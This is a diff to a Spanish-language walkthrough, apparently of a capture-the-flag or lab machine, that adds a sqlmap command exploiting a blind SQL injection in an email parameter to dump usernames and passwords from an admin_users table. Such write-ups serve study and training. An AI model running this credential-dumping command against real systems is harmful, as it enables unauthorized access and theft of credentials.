@@ -48,6 +48,9 @@ si intentamos cambiar la contraseña podemos notar que nos da como resultado una
 
 ### sqlmap
 después de hacer un montón de pruebas hemos descubierto que el parámetro mail es vulnerable a sqli blind por lo que vamos a comprobarla con 
+```python
+sqlmap -r request.txt --level 5 --risk 3 -p email --batch -D usage_blog -T admin_users -C username,password --dump
+```
 
 ![[Pasted image 20240415193303.png]]
 
